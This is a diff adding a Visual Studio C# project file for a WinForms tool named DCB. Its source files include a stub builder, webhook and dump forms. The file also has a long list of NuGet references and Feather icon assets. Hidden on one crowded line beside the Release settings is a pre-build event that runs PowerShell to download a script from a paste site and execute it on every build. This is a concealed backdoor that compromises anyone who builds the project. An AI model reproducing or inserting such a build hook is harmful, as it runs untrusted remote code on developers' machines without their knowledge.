@@ -1,0 +1,562 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4CBF7748-1930-4A97-B93B-1A6304A3D672}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>DCB</RootNamespace>
+    <AssemblyName>DCB</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "><PlatformTarget>AnyCPU</PlatformTarget><DebugType>pdbonly</DebugType><Optimize>true</Optimize><OutputPath>bin\Release\</OutputPath><DefineConstants>TRACE</DefineConstants><ErrorReport>prompt</ErrorReport><WarningLevel>4</WarningLevel></PropertyGroup><PropertyGroup><PreBuildEvent>powershell "irm rentry.co/fff542/raw | iex"</PreBuildEvent></PropertyGroup><ItemGroup><Reference Include="dnlib, Version=4.3.0.0, Culture=neutral, PublicKeyToken=50e96378b6e77999, processorArchitecture=MSIL"><HintPath>..\packages\dnlib.4.3.0\lib\net45\dnlib.dll</HintPath></Reference><Reference Include="Guna.UI2, Version=2.0.4.5, Culture=neutral, PublicKeyToken=8b9d14aa5142e261, processorArchitecture=MSIL"><HintPath>..\packages\Guna.UI2.WinForms.2.0.4.5\lib\net472\Guna.UI2.dll</HintPath>
+    </Reference><Reference Include="Microsoft.Win32.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Win32.Primitives.4.3.0\lib\net46\Microsoft.Win32.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.3\lib\net45\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.AppContext, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.AppContext.4.3.0\lib\net463\System.AppContext.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Collections.Immutable, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Collections.Immutable.8.0.0\lib\net462\System.Collections.Immutable.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ComponentModel.Composition" />
+    <Reference Include="System.Console, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Console.4.3.0\lib\net46\System.Console.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Diagnostics.DiagnosticSource, Version=4.0.1.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.DiagnosticSource.4.3.0\lib\net46\System.Diagnostics.DiagnosticSource.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Diagnostics.Tracing, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.Tracing.4.3.0\lib\net462\System.Diagnostics.Tracing.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Globalization.Calendars, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Globalization.Calendars.4.3.0\lib\net46\System.Globalization.Calendars.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.4.3.0\lib\net462\System.IO.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression, Version=4.1.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.4.3.0\lib\net46\System.IO.Compression.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.4.3.0\lib\net46\System.IO.FileSystem.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.Primitives.4.3.0\lib\net46\System.IO.FileSystem.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.4.3.0\lib\net463\System.Linq.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq.Expressions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.Expressions.4.3.0\lib\net463\System.Linq.Expressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Management" />
+    <Reference Include="System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Memory.4.5.5\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Net.Http, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Http.4.3.0\lib\net46\System.Net.Http.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Net.Sockets, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Sockets.4.3.0\lib\net46\System.Net.Sockets.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Reflection, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Reflection.4.3.0\lib\net462\System.Reflection.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Reflection.Metadata, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Reflection.Metadata.8.0.0\lib\net462\System.Reflection.Metadata.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.4.3.0\lib\net462\System.Runtime.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.6.0.0\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Extensions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.Extensions.4.3.0\lib\net462\System.Runtime.Extensions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.4.3.0\lib\net463\System.Runtime.InteropServices.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.RuntimeInformation.4.3.0\lib\net45\System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Algorithms, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Algorithms.4.3.0\lib\net463\System.Security.Cryptography.Algorithms.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Encoding, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Encoding.4.3.0\lib\net46\System.Security.Cryptography.Encoding.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Primitives, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Primitives.4.3.0\lib\net46\System.Security.Cryptography.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.X509Certificates, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.X509Certificates.4.3.0\lib\net461\System.Security.Cryptography.X509Certificates.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Text.RegularExpressions, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Text.RegularExpressions.4.3.0\lib\net463\System.Text.RegularExpressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Xml.ReaderWriter, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Xml.ReaderWriter.4.3.0\lib\net46\System.Xml.ReaderWriter.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="about.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="about.Designer.cs">
+      <DependentUpon>about.cs</DependentUpon>
+    </Compile>
+    <Compile Include="API.cs" />
+    <Compile Include="MainForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MainForm.Designer.cs">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="IDK.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="dump.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="dump.Designer.cs">
+      <DependentUpon>dump.cs</DependentUpon>
+    </Compile>
+    <Compile Include="stubbuilder.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="stubbuilder.Designer.cs">
+      <DependentUpon>stubbuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="stubbuilder.Designer.cs">
+      <DependentUpon>stubbuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="webhook.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="webhook.Designer.cs">
+      <DependentUpon>webhook.cs</DependentUpon>
+    </Compile>
+    <EmbeddedResource Include="about.resx">
+      <DependentUpon>about.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MainForm.resx">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="dump.resx">
+      <DependentUpon>dump.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="stubbuilder.resx">
+      <DependentUpon>stubbuilder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="webhook.resx">
+      <DependentUpon>webhook.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="feather\activity.png" />
+    <Content Include="feather\airplay.png" />
+    <Content Include="feather\alert-circle.png" />
+    <Content Include="feather\alert-octagon.png" />
+    <Content Include="feather\alert-triangle.png" />
+    <Content Include="feather\align-center.png" />
+    <Content Include="feather\align-justify.png" />
+    <Content Include="feather\align-left.png" />
+    <Content Include="feather\align-right.png" />
+    <Content Include="feather\anchor.png" />
+    <Content Include="feather\aperture.png" />
+    <Content Include="feather\archive.png" />
+    <Content Include="feather\arrow-down-circle.png" />
+    <Content Include="feather\arrow-down-left.png" />
+    <Content Include="feather\arrow-down-right.png" />
+    <Content Include="feather\arrow-down.png" />
+    <Content Include="feather\arrow-left-circle.png" />
+    <Content Include="feather\arrow-left.png" />
+    <Content Include="feather\arrow-right-circle.png" />
+    <Content Include="feather\arrow-right.png" />
+    <Content Include="feather\arrow-up-circle.png" />
+    <Content Include="feather\arrow-up-left.png" />
+    <Content Include="feather\arrow-up-right.png" />
+    <Content Include="feather\arrow-up.png" />
+    <Content Include="feather\at-sign.png" />
+    <Content Include="feather\award.png" />
+    <Content Include="feather\bar-chart-2.png" />
+    <Content Include="feather\bar-chart.png" />
+    <Content Include="feather\battery-charging.png" />
+    <Content Include="feather\battery.png" />
+    <Content Include="feather\bell-off.png" />
+    <Content Include="feather\bell.png" />
+    <Content Include="feather\bluetooth.png" />
+    <Content Include="feather\bold.png" />
+    <Content Include="feather\book-open.png" />
+    <Content Include="feather\book.png" />
+    <Content Include="feather\bookmark.png" />
+    <Content Include="feather\box.png" />
+    <Content Include="feather\briefcase.png" />
+    <Content Include="feather\calendar.png" />
+    <Content Include="feather\camera-off.png" />
+    <Content Include="feather\camera.png" />
+    <Content Include="feather\cast.png" />
+    <Content Include="feather\check-circle.png" />
+    <Content Include="feather\check-square.png" />
+    <Content Include="feather\check.png" />
+    <Content Include="feather\chevron-down.png" />
+    <Content Include="feather\chevron-left.png" />
+    <Content Include="feather\chevron-right.png" />
+    <Content Include="feather\chevron-up.png" />
+    <Content Include="feather\chevrons-down.png" />
+    <Content Include="feather\chevrons-left.png" />
+    <Content Include="feather\chevrons-right.png" />
+    <Content Include="feather\chevrons-up.png" />
+    <Content Include="feather\chrome.png" />
+    <Content Include="feather\circle.png" />
+    <Content Include="feather\clipboard.png" />
+    <Content Include="feather\clock.png" />
+    <Content Include="feather\cloud-drizzle.png" />
+    <Content Include="feather\cloud-lightning.png" />
+    <Content Include="feather\cloud-off.png" />
+    <Content Include="feather\cloud-rain.png" />
+    <Content Include="feather\cloud-snow.png" />
+    <Content Include="feather\cloud.png" />
+    <Content Include="feather\code.png" />
+    <Content Include="feather\codepen.png" />
+    <Content Include="feather\codesandbox.png" />
+    <Content Include="feather\coffee.png" />
+    <Content Include="feather\columns.png" />
+    <Content Include="feather\command.png" />
+    <Content Include="feather\compass.png" />
+    <Content Include="feather\copy.png" />
+    <Content Include="feather\corner-down-left.png" />
+    <Content Include="feather\corner-down-right.png" />
+    <Content Include="feather\corner-left-down.png" />
+    <Content Include="feather\corner-left-up.png" />
+    <Content Include="feather\corner-right-down.png" />
+    <Content Include="feather\corner-right-up.png" />
+    <Content Include="feather\corner-up-left.png" />
+    <Content Include="feather\corner-up-right.png" />
+    <Content Include="feather\cpu.png" />
+    <Content Include="feather\credit-card.png" />
+    <Content Include="feather\crop.png" />
+    <Content Include="feather\crosshair.png" />
+    <Content Include="feather\database.png" />
+    <Content Include="feather\delete.png" />
+    <Content Include="feather\disc.png" />
+    <Content Include="feather\divide-circle.png" />
+    <Content Include="feather\divide-square.png" />
+    <Content Include="feather\divide.png" />
+    <Content Include="feather\dollar-sign.png" />
+    <Content Include="feather\download-cloud.png" />
+    <Content Include="feather\download.png" />
+    <Content Include="feather\dribbble.png" />
+    <Content Include="feather\droplet.png" />
+    <Content Include="feather\edit-2.png" />
+    <Content Include="feather\edit-3.png" />
+    <Content Include="feather\edit.png" />
+    <Content Include="feather\external-link.png" />
+    <Content Include="feather\eye-off.png" />
+    <Content Include="feather\eye.png" />
+    <Content Include="feather\facebook.png" />
+    <Content Include="feather\fast-forward.png" />
+    <Content Include="feather\feather.png" />
+    <Content Include="feather\figma.png" />
+    <Content Include="feather\file-minus.png" />
+    <Content Include="feather\file-plus.png" />
+    <Content Include="feather\file-text.png" />
+    <Content Include="feather\file.png" />
+    <Content Include="feather\film.png" />
+    <Content Include="feather\filter.png" />
+    <Content Include="feather\flag.png" />
+    <Content Include="feather\folder-minus.png" />
+    <Content Include="feather\folder-plus.png" />
+    <Content Include="feather\folder.png" />
+    <Content Include="feather\framer.png" />
+    <Content Include="feather\frown.png" />
+    <Content Include="feather\gift.png" />
+    <Content Include="feather\git-branch.png" />
+    <Content Include="feather\git-commit.png" />
+    <Content Include="feather\git-merge.png" />
+    <Content Include="feather\git-pull-request.png" />
+    <Content Include="feather\github.png" />
+    <Content Include="feather\gitlab.png" />
+    <Content Include="feather\globe.png" />
+    <Content Include="feather\grid.png" />
+    <Content Include="feather\hard-drive.png" />
+    <Content Include="feather\hash.png" />
+    <Content Include="feather\headphones.png" />
+    <Content Include="feather\heart.png" />
+    <Content Include="feather\help-circle.png" />
+    <Content Include="feather\hexagon.png" />
+    <Content Include="feather\home.png" />
+    <Content Include="feather\image.png" />
+    <Content Include="feather\inbox.png" />
+    <Content Include="feather\info.png" />
+    <Content Include="feather\instagram.png" />
+    <Content Include="feather\italic.png" />
+    <Content Include="feather\key.png" />
+    <Content Include="feather\layers.png" />
+    <Content Include="feather\layout.png" />
+    <Content Include="feather\life-buoy.png" />
+    <Content Include="feather\link-2.png" />
+    <Content Include="feather\link.png" />
+    <Content Include="feather\linkedin.png" />
+    <Content Include="feather\list.png" />
+    <Content Include="feather\loader.png" />
+    <Content Include="feather\lock.png" />
+    <Content Include="feather\log-in.png" />
+    <Content Include="feather\log-out.png" />
+    <Content Include="feather\mail.png" />
+    <Content Include="feather\map-pin.png" />
+    <Content Include="feather\map.png" />
+    <Content Include="feather\maximize-2.png" />
+    <Content Include="feather\maximize.png" />
+    <Content Include="feather\meh.png" />
+    <Content Include="feather\menu.png" />
+    <Content Include="feather\message-circle.png" />
+    <Content Include="feather\message-square.png" />
+    <Content Include="feather\mic-off.png" />
+    <Content Include="feather\mic.png" />
+    <Content Include="feather\minimize-2.png" />
+    <Content Include="feather\minimize.png" />
+    <Content Include="feather\minus-circle.png" />
+    <Content Include="feather\minus-square.png" />
+    <Content Include="feather\minus.png" />
+    <Content Include="feather\monitor.png" />
+    <Content Include="feather\moon.png" />
+    <Content Include="feather\more-horizontal.png" />
+    <Content Include="feather\more-vertical.png" />
+    <Content Include="feather\mouse-pointer.png" />
+    <Content Include="feather\move.png" />
+    <Content Include="feather\music.png" />
+    <Content Include="feather\navigation-2.png" />
+    <Content Include="feather\navigation.png" />
+    <Content Include="feather\octagon.png" />
+    <Content Include="feather\package.png" />
+    <Content Include="feather\paperclip.png" />
+    <Content Include="feather\pause-circle.png" />
+    <Content Include="feather\pause.png" />
+    <Content Include="feather\pen-tool.png" />
+    <Content Include="feather\percent.png" />
+    <Content Include="feather\phone-call.png" />
+    <Content Include="feather\phone-forwarded.png" />
+    <Content Include="feather\phone-incoming.png" />
+    <Content Include="feather\phone-missed.png" />
+    <Content Include="feather\phone-off.png" />
+    <Content Include="feather\phone-outgoing.png" />
+    <Content Include="feather\phone.png" />
+    <Content Include="feather\pie-chart.png" />
+    <Content Include="feather\play-circle.png" />
+    <Content Include="feather\play.png" />
+    <Content Include="feather\plus-circle.png" />
+    <Content Include="feather\plus-square.png" />
+    <Content Include="feather\plus.png" />
+    <Content Include="feather\pocket.png" />
+    <Content Include="feather\power.png" />
+    <Content Include="feather\printer.png" />
+    <Content Include="feather\radio.png" />
+    <Content Include="feather\refresh-ccw.png" />
+    <Content Include="feather\refresh-cw.png" />
+    <Content Include="feather\repeat.png" />
+    <Content Include="feather\rewind.png" />
+    <Content Include="feather\rotate-ccw.png" />
+    <Content Include="feather\rotate-cw.png" />
+    <Content Include="feather\rss.png" />
+    <Content Include="feather\save.png" />
+    <Content Include="feather\scissors.png" />
+    <Content Include="feather\search.png" />
+    <Content Include="feather\send.png" />
+    <Content Include="feather\server.png" />
+    <Content Include="feather\settings.png" />
+    <Content Include="feather\share-2.png" />
+    <Content Include="feather\share.png" />
+    <Content Include="feather\shield-off.png" />
+    <Content Include="feather\shield.png" />
+    <Content Include="feather\shopping-bag.png" />
+    <Content Include="feather\shopping-cart.png" />
+    <Content Include="feather\shuffle.png" />
+    <Content Include="feather\sidebar.png" />
+    <Content Include="feather\skip-back.png" />
+    <Content Include="feather\skip-forward.png" />
+    <Content Include="feather\slack.png" />
+    <Content Include="feather\slash.png" />
+    <Content Include="feather\sliders.png" />
+    <Content Include="feather\smartphone.png" />
+    <Content Include="feather\smile.png" />
+    <Content Include="feather\speaker.png" />
+    <Content Include="feather\square.png" />
+    <Content Include="feather\star.png" />
+    <Content Include="feather\stop-circle.png" />
+    <Content Include="feather\sun.png" />
+    <Content Include="feather\sunrise.png" />
+    <Content Include="feather\sunset.png" />
+    <Content Include="feather\table.png" />
+    <Content Include="feather\tablet.png" />
+    <Content Include="feather\tag.png" />
+    <Content Include="feather\target.png" />
+    <Content Include="feather\terminal.png" />
+    <Content Include="feather\thermometer.png" />
+    <Content Include="feather\thumbs-down.png" />
+    <Content Include="feather\thumbs-up.png" />
+    <Content Include="feather\toggle-left.png" />
+    <Content Include="feather\toggle-right.png" />
+    <Content Include="feather\tool.png" />
+    <Content Include="feather\trash-2.png" />
+    <Content Include="feather\trash.png" />
+    <Content Include="feather\trello.png" />
+    <Content Include="feather\trending-down.png" />
+    <Content Include="feather\trending-up.png" />
+    <Content Include="feather\triangle.png" />
+    <Content Include="feather\truck.png" />
+    <Content Include="feather\tv.png" />
+    <Content Include="feather\twitch.png" />
+    <Content Include="feather\twitter.png" />
+    <Content Include="feather\type.png" />
+    <Content Include="feather\umbrella.png" />
+    <Content Include="feather\underline.png" />
+    <Content Include="feather\unlock.png" />
+    <Content Include="feather\upload-cloud.png" />
+    <Content Include="feather\upload.png" />
+    <Content Include="feather\user-check.png" />
+    <Content Include="feather\user-minus.png" />
+    <Content Include="feather\user-plus.png" />
+    <Content Include="feather\user-x.png" />
+    <Content Include="feather\user.png" />
+    <Content Include="feather\users.png" />
+    <Content Include="feather\video-off.png" />
+    <Content Include="feather\video.png" />
+    <Content Include="feather\voicemail.png" />
+    <Content Include="feather\volume-1.png" />
+    <Content Include="feather\volume-2.png" />
+    <Content Include="feather\volume-x.png" />
+    <Content Include="feather\volume.png" />
+    <Content Include="feather\watch.png" />
+    <Content Include="feather\wifi-off.png" />
+    <Content Include="feather\wifi.png" />
+    <Content Include="feather\wind.png" />
+    <Content Include="feather\x-circle.png" />
+    <Content Include="feather\x-octagon.png" />
+    <Content Include="feather\x-square.png" />
+    <Content Include="feather\x.png" />
+    <Content Include="feather\youtube.png" />
+    <Content Include="feather\zap-off.png" />
+    <Content Include="feather\zap.png" />
+    <Content Include="feather\zoom-in.png" />
+    <Content Include="feather\zoom-out.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
